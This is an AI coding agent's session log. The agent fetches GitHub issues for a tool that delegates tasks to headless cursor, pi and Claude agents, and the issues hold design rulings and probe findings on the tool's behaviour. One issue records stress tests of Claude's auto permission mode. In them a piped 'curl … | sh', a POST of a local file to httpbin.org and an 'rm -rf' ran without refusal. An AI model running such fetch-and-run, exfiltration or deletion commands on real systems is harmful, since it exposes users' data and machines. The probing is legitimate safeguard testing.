ol_call\":{\"shellToolCall\":{\"args\":{\"command\":\"cd /Users/user/work/delegate-7-tracer && gh issue view 4 --comments\",\"workingDirectory\":\"\",\"timeout\":30000,\"toolCallId\":\"tool_eb875959-7d27-439a-8b4e-682d339e1b6\",\"simpleCommands\":[\"cd\",\"gh\"],\"hasInputRedirect\":false,\"hasOutputRedirect\":false,\"parsingResult\":{\"parsingFailed\":false,\"executableCommands\":[{\"name\":\"cd\",\"args\":[{\"type\":\"word\",\"value\":\"/Users/user/work/delegate-7-tracer\"}],\"fullText\":\"cd /Users/user/work/delegate-7-tracer\"},{\"name\":\"gh\",\"args\":[{\"type\":\"word\",\"value\":\"issue\"},{\"type\":\"word\",\"value\":\"view\"},{\"type\":\"number\",\"value\":\"4\"},{\"type\":\"word\",\"value\":\"--comments\"}],\"fullText\":\"gh issue view 4 --comments\"}],\"hasRedirects\":false,\"hasCommandSubstitution\":false,\"redirects\":[]},\"fileOutputThresholdBytes\":\"40000\",\"isBackground\":false,\"skipApproval\":false,\"timeoutBehavior\":\"TIMEOUT_BEHAVIOR_BACKGROUND\",\"hardTimeout\":86400000,\"descri [... omitted end of long line]","contentTruncated":false,"isContextLine":false}]},{"file":"./tests/fixtures/claude/review-18.stdout","matches":[{"lineNumber":15,"content":"{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"tool_use_id\":\"toolu_01HGCobLa7Nx9QjMUKTdjMFz\",\"type\":\"tool_result\",\"content\":\"title:\\ttest: recording script and redacted headless fixtures (#6)\\nstate:\\tDRAFT\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\t\\nassignees:\\t\\nreviewers:\\t\\nprojects:\\t\\nmilestone:\\t\\nnumber:\\t18\\nurl:\\thttps://github.com/user/delegate/pull/18\\nadditions:\\t1972\\ndeletions:\\t0\\nauto-merge:\\tdisabled\\n--\\nFixes #6\\n\\n- `scripts/record.sh BACKEND MODEL CAPABILITY NAME [CWD] [SESSION] < prompt` runs one prompt through cursor-agent, pi or claude with the flags spec #4 assigns. It writes `tests/fixtures/<backend>/NAME.{stdout,stderr,argv}`. `CANCEL_AFTER=N` records a run cancelled with SIGTERM.\\n- `scripts/redact.jq` strips the recording user's setup (pi system-prompt sections and extension tool schemas; Claude init lists and hook output). The home-directory name is replaced with `user`.\\n- 22 recorded runs across cursor, pi and Claude: plain answer, tool calls, r [... omitted end of long line]","contentTruncated":false,"isContextLine":false},{"lineNumber":20,"content":"{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"tool_use_id\":\"toolu_01FKZWbvxr8HjdhvcCbZixe8\",\"type\":\"tool_result\",\"content\":\"     1\\t#!/usr/bin/env bash\\n     2\\t# Run one prompt through a backend's raw headless CLI and save stdout/stderr as a parser fixture.\\n     3\\t#\\n     4\\t#   scripts/record.sh BACKEND MODEL CAPABILITY NAME [CWD] [SESSION] < prompt\\n     5\\t#\\n     6\\t# BACKEND: cursor | pi | claude. CAPABILITY: read-only | read-write (pi rejects read-only).\\n     7\\t# SESSION resumes that backend session; pi and claude get a fresh id when it is omitted.\\n     8\\t# CANCEL_AFTER=N sends the CLI SIGTERM after N seconds.\\n     9\\t# Writes tests/fixtures/BACKEND/NAME.{stdout,stderr,argv}; prints the session id (if chosen) and exit code.\\n    10\\tset -uo pipefail\\n    11\\t\\n    12\\t[ $# -ge 4 ] || { sed -n 2,9p \\\"$0\\\"; exit 2; }\\n    13\\tbackend=$1 model=$2 cap=$3 name=$4 cwd=${5:-$PWD} session=${6:-}\\n    14\\there=\\\"$(cd \\\"$(dirname \\\"$0\\\")\\\" && pwd)\\\"\\n    15\\tout=\\\"$here/../t [... omitted end of long line]","contentTruncated":false,"isContextLine":false}]}],"totalLines":24,"totalMatchedLines":24,"clientTruncated":false,"ripgrepTruncated":false}}}}}},"hookAdditionalContexts":[],"toolCallId":"tool_69b5b09a-33a2-4d8c-9775-ce53a1d0a32","startedAtMs":"1790845569291","completedAtMs":"1790845570020"},"model_call_id":"5d97dc51-aeb0-476e-a6af-a8d07968be1e-0-5p7g","session_id":"42a2d878-df96-4e92-9fef-880dad80ff16","timestamp_ms":1790845570001}
{"type":"tool_call","subtype":"completed","call_id":"tool_20f8ad4c-05b8-4a3d-9325-abbe20e11c0","tool_call":{"readToolCall":{"args":{"path":"/Users/user/work/delegate-fixtures/docs/agents/issue-tracker.md"},"result":{"success":{"content":"# Issue tracker: GitHub\n\nIssues and specs live in GitHub Issues on this repo. Use `gh`; it infers the repo from the clone.\n\n- **Publish** (a spec, a ticket): `gh issue create`, multi-line body from a heredoc or `--body-file`.\n- **Fetch a ticket**: `gh issue view <n> --comments`.\n- **Labels**: the triage vocabulary is in `triage-labels.md`.\n- **Triage covers issues only.** Pull requests here are the owner's own work and never enter the triage queue.\n\n## Wayfinding\n\n`/wayfinder` keeps a **map**: one issue labelled `wayfinder:map` holding Notes, Decisions so far, and Fog. Its tickets are child issues.\n\n- **Child ticket**: a GitHub sub-issue of the map, labelled `wayfinder:<research|prototype|grilling|task>`. Without sub-issues, list the child in a task list in the map body and open the child body with `Part of #<map>`.\n- **Blocking**: native issue dependencies. Add an edge with `gh api --method POST repos/<owner>/<repo>/issues/<child>/dependencies/blocked_by -F issue_id=<blocker-db-id>`. The blocker's database id comes from `gh api repos/<owner>/<repo>/issues/<n> --jq .id`; the `#number` and `node_id` are rejected. Without dependencies, open the child body with `Blocked by: #<n>, #<n>`. A ticket is unblocked once every blocker is closed.\n- **Frontier**: the map's open children with zero open blockers (`issue_dependencies_summary.blocked_by`) and no assignee; the first in map order wins.\n- **Claim**: `gh issue edit <n> --add-assignee @me`, as the session's first write.\n- **Resolve**: comment the answer, close the issue, then append a one-line pointer (gist + link) to the map's Decisions so far.\n","isEmpty":false,"exceededLimit":false,"totalLines":19,"fileSize":1618,"path":"/Users/user/work/delegate-fixtures/docs/agents/issue-tracker.md","readRange":{"startLine":1,"endLine":19},"relatedCursorRulePaths":[],"relatedCursorRules":[]}}},"hookAdditionalContexts":[],"toolCallId":"tool_20f8ad4c-05b8-4a3d-9325-abbe20e11c0","startedAtMs":"1790845569272","completedAtMs":"1790845570025"},"model_call_id":"5d97dc51-aeb0-476e-a6af-a8d07968be1e-0-5p7g","session_id":"42a2d878-df96-4e92-9fef-880dad80ff16","timestamp_ms":1790845570002}
{"type":"tool_call","subtype":"completed","call_id":"tool_518d1a4f-a72e-4924-9620-11bb097c16f","tool_call":{"shellToolCall":{"args":{"command":"cd /Users/user/work/delegate-fixtures && gh issue view 17 --comments && echo '---' && gh issue view 4 --comments && echo '---' && for i in 7 9 10 11 12 13 6; do echo \"=== ISSUE $i ===\"; gh issue view $i --comments 2>/dev/null | head -200; done","workingDirectory":"","timeout":30000,"toolCallId":"tool_518d1a4f-a72e-4924-9620-11bb097c16f","simpleCommands":["cd","gh","echo","gh","echo","echo","gh","head"],"hasInputRedirect":false,"hasOutputRedirect":true,"parsingResult":{"parsingFailed":false,"executableCommands":[{"name":"cd","args":[{"type":"word","value":"/Users/user/work/delegate-fixtures"}],"fullText":"cd /Users/user/work/delegate-fixtures"},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"number","value":"17"},{"type":"word","value":"--comments"}],"fullText":"gh issue view 17 --comments"},{"name":"echo","args":[{"type":"raw_string","value":"'---'"}],"fullText":"echo '---'"},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"number","value":"4"},{"type":"word","value":"--comments"}],"fullText":"gh issue view 4 --comments"},{"name":"echo","args":[{"type":"raw_string","value":"'---'"}],"fullText":"echo '---'"},{"name":"echo","args":[{"type":"string","value":"\"=== ISSUE $i ===\""}],"fullText":"echo \"=== ISSUE $i ===\""},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"simple_expansion","value":"$i"},{"type":"word","value":"--comments"}],"fullText":"gh issue view $i --comments"},{"name":"head","args":[{"type":"number","value":"-200"}],"fullText":"head -200"}],"hasRedirects":true,"hasCommandSubstitution":false,"allRedirectsAreDevNull":true,"redirects":[{"operator":">","destinationFds":[2],"targetNodeType":"word","targetText":"/dev/null"}]},"fileOutputThresholdBytes":"40000","isBackground":false,"skipApproval":false,"timeoutBehavior":"TIMEOUT_BEHAVIOR_BACKGROUND","hardTimeout":86400000,"description":"Fetch GitHub issues 17, 4, 6-13 with comments","closeStdin":true,"conversationId":"42a2d878-df96-4e92-9fef-880dad80ff16","adminCommandDenylist":[],"requestId":"5d97dc51-aeb0-476e-a6af-a8d07968be1e"},"result":{"success":{"command":"cd /Users/user/work/delegate-fixtures && gh issue view 17 --comments && echo '---' && gh issue view 4 --comments && echo '---' && for i in 7 9 10 11 12 13 6; do echo \"=== ISSUE $i ===\"; gh issue view $i --comments 2>/dev/null | head -200; done","workingDirectory":"","exitCode":0,"signal":"","stdout":"---\nauthor:\tuser\nassociation:\towner\nedited:\ttrue\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #18. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_denials` is `[]` in every run. No ExitPlanMode call appears in the stream.\n\n**Decision for #17: keep `--permission-mode plan` for read-only Claude. No fallback.** It answers read-only work and refuses edits by ending NEEDS_CONTEXT, which resume handles (`--capability read-write`). A `--disallowedTools Edit,Write,…` fallback would block plan-file writes but not Bash, so it is weaker. Not tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n\n--\n---\n=== ISSUE 7 ===\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. Real detached supervisor; the status file is the only source of truth. The MCP `job_registry` stays untouched until #13.\n2. Record path: `$TMPDIR/delegate-jobs/<uuid>.json`.\n3. Record shape: whatever is cheapest to implement and parse. That means the existing `PollResult` JSON (camelCase) plus `supervisorPid`, `heartbeatAt` and `resume {model, cwd, capability, sessionId}`.\n4. Heartbeat: 30s by default. Tests shorten it with a `DELEGATE_HEARTBEAT_MS` environment override. The supervisor is a separate process, so a fake clock cannot be shared with it.\n5. `watch`: one JSON line per job, in argument order. Exit 0 when all are terminal. On timeout, print the current records and exit 1.\n6. `watch` on an unknown job id exits 2 at once.\n7. Bad input to `run` (unknown model, empty prompt) exits 2 with the reason on stderr. An unknown model also lists the valid ids.\n8. The CLI appends only the STATUS-line instruction. The MCP prompt path is unchanged.\n9. A status-record write failure makes the supervisor exit non-zero. A supervisor that dies leaving RUNNING is deferred to #9.\n10. A second `[[bin]]` named `delegate` in `src/bin/delegate.rs`, sharing the library.\n\n--\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\nClarification on ruling 3: the heartbeat field is `lastHeartbeatAt`, reused from `PollResult`, not a new `heartbeatAt`.\n--\n=== ISSUE 9 ===\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **BUSY:** a second read-write `run` or `resume` in a locked cwd prints `BUSY <holderJobId>` on stderr and exits 3.\n2. **Gate timeout:** the gate is killed if it runs past the job's tool-idle window (`--tool-idle-ms`, default 1800s). There is no new flag.\n3. **Lock:** `flock` on `$TMPDIR/delegate-locks/<hash of canonical cwd>.lock`, held by the supervisor. The file holds the job id.\n4. **Idle defaults:** model-idle 300s and tool-idle 1800s, carried over from the host profile.\n5. **Change-set:** always lists the commits made during the run, plus a concern if the tree is still dirty. The #6 probe showed a delegated Claude commits on its own branch.\n6. **MCP:** the old MCP `cursor_run` path does not take the file lock. That gap is accepted until #13 deletes MCP.\n7. **Dead supervisor** (deferred from #7): stale-heartbeat handling belongs here.\n--\n=== ISSUE 10 ===\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **Output:** `resume` prints the new job id, like `run`.\n2. **Cancel on a terminal job:** a no-op. It prints the record and exits 0.\n3. **Resume errors:** `resume` on a RUNNING job, or on a record with no session id, exits 2 with the reason on stderr.\n4. **Chain links:** resuming A as B writes `supersededBy: B` into A's record and `resumedFrom: A` into B's. This keeps the reason MCP added the pointer (commit 8b21892): a watcher on a resumed NEEDS_CONTEXT record must be able to follow the chain instead of acting on the stale question.\n5. **Cancel:** SIGTERM to the supervisor's process group, then SIGKILL after 5s. If `cancel` had to SIGKILL, it writes CANCELLED itself.\n6. **Busy cwd:** a read-write resume into a locked cwd follows the #9 BUSY ruling (stderr `BUSY <holder>`, exit 3).\n--\n=== ISSUE 11 ===\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **`delegate models`:** an aligned text table with id, label, backend and $in/$out per 1M tokens. The default is marked `*`. Rows sort by backend, then id.\n2. **`delegate doctor`:** human-readable text on stdout, one ok/warn/fail line per check. Missing or renamed models are warnings. It exits 0 when there are only warnings, and 1 on a hard failure (binary missing, or not logged in).\n3. **pi and claude models before #16/#17 land:** `run` exits 2 with `backend not implemented`, and `doctor` prints a skip line for each.\n4. **Model table:** `backend` replaces `family`. The ids are the 13 listed in #11 and spec story 45. Grok 4.7 is priced as Grok 4.6.\n--\n=== ISSUE 12 ===\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings: orchestrator ruling (owner asleep; reversible)\n\n1. **Slow-run negative control:** no test-only delay hook in production code. The lane records the negative control in the PR instead: it adds a local sleep before `run` prints its id, shows the test failing, then removes the sleep.\n2. **Supervisor memory:** sample `ps -o rss= -p <supervisorPid>` (the pid comes from the status record) while the fake agent holds RUNNING. The same command works on macOS and Linux, so the test needs no per-OS code.\n3. **Latency endpoint:** wall clock until the process exits. `run` and `resume` exit right after printing the id.\n4. **Cases timed:** `watch` on an already-terminal job, with no timeout path. `cancel` on a RUNNING job whose fake agent exits on SIGTERM. `doctor` against fakes that exit 0.\n5. **Budget constants:** about 3x the local measurement, with the measured baseline in a comment beside each. No retries: if CI is noisy, raise the margin.\n6. **Fake agents** wait on release files, never on sleeps (the lesson from #7).\n--\n=== ISSUE 13 ===\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings: orchestrator ruling (owner asleep; reversible)\n\n1. **Crate:** rename the crate to `delegate`. `delegate` is the only binary; `cursor-delegate-mcp` is removed.\n2. **Code to delete:** `src/index*`, `job_registry*`, `tool_schemas.rs`, `progress.rs`, `validate.rs` and the MCP e2e tests, plus anything else only they use. The supervisor must not depend on `JobRegistry`.\n3. **Environment variable:** `CURSOR_DELEGATE_HOST_PROFILE` is dropped outright, not aliased. Setup moves the file.\n4. **Setup:** build the release binary and copy it to `~/.local/bin/delegate`. Move `~/.config/cursor-delegate/<profile>` to `~/.config/delegate/` only if the destination is absent; otherwise print a note and leave both. If there is no old profile, do nothing.\n5. **Old status records:** leftover `cursor-delegate-jobs` records get no migration.\n6. **Old-name references:** allowed only in setup's migration code.\n7. **Plugin:** the plugin and marketplace ids become `delegate`, version 1.0.0, shipping the skill only.\n8. **Running setup on this machine** changes the owner's `~/.local/bin`, `~/.config` and installed plugin. That is deferred to the owner: the morning report carries the exact commands and the `~/.claude/settings.json` edits. CI covers the rest.\n--\n=== ISSUE 6 ===\n","stderr":"","executionTime":9579,"interleavedOutput":"---\nauthor:\tuser\nassociation:\towner\nedited:\ttrue\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #18. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to 